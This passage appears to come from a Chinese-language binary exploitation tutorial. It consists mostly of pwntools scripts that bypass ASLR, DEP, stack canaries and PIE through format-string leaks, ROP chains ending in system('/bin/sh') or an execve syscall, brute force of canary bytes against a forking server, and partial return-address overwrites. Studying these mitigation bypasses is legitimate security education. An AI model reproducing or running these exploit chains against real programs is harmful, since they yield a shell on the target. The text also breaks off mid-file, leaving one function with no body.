```python
# ASLR绕过: 通过格式化字符串泄露libc地址
from pwn import *

def aslr_bypass_fmtstr():
    """通过格式化字符串漏洞绕过ASLR"""
    # 目标程序存在格式化字符串漏洞:
    # printf(user_input);

    p = process('./vulnerable')
    elf = ELF('./vulnerable')

    # 第一步: 泄露栈上的libc地址
    # 格式化字符串可以读取栈上的值
    # __libc_start_main的返回地址通常在栈上

    # 泄露多个栈值
    payload = b'%p.' * 20
    p.sendline(payload)
    leak = p.recvline()

    # 解析泄露的地址
    addrs = []
    for part in leak.split(b'.'):
        try:
            addr = int(part, 16)
            addrs.append(addr)
        except:
            continue

    # 找到__libc_start_main的返回地址(通常在第7-15个参数位置)
    libc_base = None
    for addr in addrs:
        # 检查是否是libc地址范围(0x7f开头)
        if (addr >> 40) == 0x7f:
            # 计算libc基址
            # __libc_start_main的偏移减去返回地址偏移
            libc_start_offset = elf.symbols.get('__libc_start_main', 0)
            if libc_start_offset:
                libc_base = addr - libc_start_offset - 240  # 240是call后的偏移
                break

    if libc_base:
        log.success(f'libc基址: {hex(libc_base)}')

        # 计算system和/bin/sh的地址
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        system_addr = libc_base + libc.symbols['system']
        binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

        log.success(f'system: {hex(system_addr)}')
        log.success(f'/bin/sh: {hex(binsh_addr)}')

        # 现在可以构造ROP链
        return libc_base, system_addr, binsh_addr
    else:
        log.error('ASLR绕过失败')
        return None

# 另一种方式: 通过越界读泄露
def aslr_bypass_oor():
```

### 10.2 DEP绕过 - ROP链构造

```python
# DEP绕过: 完整ROP链构造示例
from pwn import *

def dep_bypass_rop():
    """完整的ROP链绕过DEP"""
    context.arch = 'amd64'

    p = process('./vulnerable')
    elf = ELF('./vulnerable')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    # 假设已知:
    # 1. 栈溢出漏洞(缓冲区大小256字节)
    # 2. 已泄露libc基址
    # 3. Canary已泄露

    libc_base = 0x7ffff7a0d000  # 从信息泄露获得
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    pop_rdi_ret = libc_base + 0x215bf  # pop rdi; ret gadget

    # 构造payload
    buffer_size = 256
    canary = 0x1234567890abcdef  # 从泄露获得

    payload = b'A' * buffer_size
    payload += p64(canary)           # 覆盖canary(保持原值)
    payload += b'B' * 8             # 覆盖saved rbp
    payload += p64(pop_rdi_ret)     # ROP: pop rdi; ret
    payload += p64(binsh_addr)       # rdi = "/bin/sh"
    payload += p64(system_addr)      # call system("/bin/sh")

    # 如果需要栈对齐(x86_64要求16字节对齐)
    # 在调用system前加一个ret
    ret_gadget = libc_base + 0x215c0  # ret gadget
    payload = b'A' * buffer_size
    payload += p64(canary)
    payload += b'B' * 8
    payload += p64(ret_gadget)       # 栈对齐
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    p.sendline(payload)
    p.interactive()

def dep_bypass_ropchain_syscall():
    """使用syscall构造execve ROP链"""
    context.arch = 'amd64'

    # execve("/bin/sh", NULL, NULL)
    # rax = 59 (execve syscall number)
    # rdi = pointer to "/bin/sh"
    # rsi = NULL
    # rdx = NULL

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_base = 0x7ffff7a0d000

    # 需要的gadgets:
    # pop rax; ret       -> 设置rax = 59
    # pop rdi; ret       -> 设置rdi = "/bin/sh"
    # pop rsi; ret       -> 设置rsi = 0
    # pop rdx; ret       -> 设置rdx = 0
    # syscall; ret       -> 触发系统调用

    # 使用ROPgadget搜索
    # ROPgadget --binary libc.so.6 --only "pop|ret"

    pop_rax = libc_base + 0x439c8  # pop rax; ret
    pop_rdi = libc_base + 0x215bf  # pop rdi; ret
    pop_rsi = libc_base + 0x215c0  # pop rsi; pop r15; ret
    pop_rdx = libc_base + 0x1b96   # pop rdx; ret
    syscall = libc_base + 0x11012  # syscall; ret
    binsh = libc_base + next(libc.search(b'/bin/sh'))

    rop_chain = b''
    rop_chain += p64(pop_rax) + p64(59)        # rax = 59
    rop_chain += p64(pop_rdi) + p64(binsh)     # rdi = "/bin/sh"
    rop_chain += p64(pop_rsi) + p64(0) + p64(0)  # rsi = 0 (额外pop r15)
    rop_chain += p64(pop_rdx) + p64(0)        # rdx = 0
    rop_chain += p64(syscall)                  # syscall

    return rop_chain
```

```python
# Canary绕过: 格式化字符串泄露 + 栈溢出
from pwn import *

def canary_bypass_fmtstr():
    """通过格式化字符串泄露Canary并绕过"""
    context.arch = 'amd64'

    p = process('./canary_vuln')
    elf = ELF('./canary_vuln')

    # 目标程序:
    # void vuln() {
    #     char buf[64];
    #     printf("Input: ");
    #     scanf("%s", buf);     // 格式化字符串漏洞
    #     printf(buf);           // 格式化字符串漏洞
    #     printf("Again: ");
    #     scanf("%s", buf);     // 第二次输入(栈溢出)
    # }

    # 步骤1: 泄露Canary
    # Canary在rbp-8位置
    # 格式化字符串的第7-9个参数是栈上数据
    # Canary通常在第7个参数位置(64位)

    # 泄露Canary
    payload = b'%7$p'
    p.sendlineafter(b'Input: ', payload)
    response = p.recvline()
    canary = int(response.strip(), 16)
    log.success(f'Canary: {hex(canary)}')

    # 步骤2: 同时泄露libc地址
    payload = b'%9$p'
    p.sendlineafter(b'Again: ', payload)
    # 实际上需要更复杂的交互，这里简化

    # 步骤3: 构造溢出payload
    # buf[64] + canary[8] + rbp[8] + ret_addr[8]
    system_addr = 0x7ffff7a28490  # 假设已知
    binsh_addr = 0x7ffff7b3c948
    pop_rdi = 0x7ffff7a215bf

    overflow_payload = b'A' * 64
    overflow_payload += p64(canary)       # 保持Canary不变
    overflow_payload += b'B' * 8         # 覆盖rbp
    overflow_payload += p64(pop_rdi)     # ROP
    overflow_payload += p64(binsh_addr)
    overflow_payload += p64(system_addr)

    p.sendlineafter(b'Input: ', overflow_payload)
    p.interactive()

def canary_bypass_bruteforce():
    """Canary逐字节爆破(fork场景)"""
    context.arch = 'i386'  # 32位更常见

    # 目标程序使用fork()
    # 子进程继承父进程的Canary
    # 可以逐字节爆破

    # 32位Canary: 4字节
    # 第1字节通常是\x00(终止符)
    # 剩余3字节需要爆破

    canary = b'\x00'  # 已知第1字节

    for i in range(1, 4):
        for byte in range(256):
            p = process('./fork_server')
            # 发送恰好覆盖到canary第i字节的payload
            payload = b'A' * (64 + i)  # 假设buffer是64字节
            payload += canary + bytes([byte])
            p.sendline(payload)
            response = p.recv(timeout=1)
            if b'OK' in response or not p.poll():
                canary += bytes([byte])
                log.success(f'Canary byte {i}: {hex(byte)}')
                p.close()
                break
            p.close()

    log.success(f'完整Canary: {canary.hex()}')
    return canary
```

```python
# PIE绕过: 泄露代码段地址
from pwn import *

def pie_bypass():
    """PIE绕过: 通过格式化字符串泄露代码段地址"""
    context.arch = 'amd64'

    p = process('./pie_vuln')

    # PIE程序加载到随机地址
    # 需要泄露代码段地址才能定位函数

    # 方法1: 泄露栈上的返回地址
    # 返回地址指向代码段
    # 格式化字符串可以泄露栈上的返回地址

    # 假设vuln函数:
    # void vuln() {
    #     char buf[64];
    #     read(0, buf, 200);  // 溢出
    #     printf(buf);        // 格式化字符串
    # }

    # 泄露返回地址(在第9个参数位置)
    payload = b'%9$p'
    p.sendline(payload)
    response = p.recvline()
    ret_addr = int(response.strip(), 16)

    log.info(f'返回地址: {hex(ret_addr)}')

    # 返回地址 = PIE基址 + 函数内偏移
    # 假设返回地址在vuln+85处
    # PIE基址 = ret_addr - 85 - vuln_offset
    # 假设vuln在ELF中的偏移是0x1234

    elf = ELF('./pie_vuln')
    # PIE基址(低12位为0)
    pie_base = (ret_addr >> 12) << 12  # 页对齐
    log.success(f'PIE基址: {hex(pie_base)}')

    # 计算目标函数地址
    target = pie_base + elf.symbols['target_func']
    log.success(f'目标函数: {hex(target)}')

    # 方法2: Partial overwrite
    # 只覆盖返回地址的低1-2字节
    # 在同一函数内跳转(如跳到one_gadget)

    # 假设one_gadget在0x1234偏移
    # 当前返回地址: 0x55a1b2c3d567
    # 覆盖低2字节为0x1234
    # 新地址: 0x55a1b2c31234 (在相同页面内)

    # Partial overwrite不需要知道PIE基址
    # 但需要暴力尝试(低12位有4096种可能)

    return pie_base
```
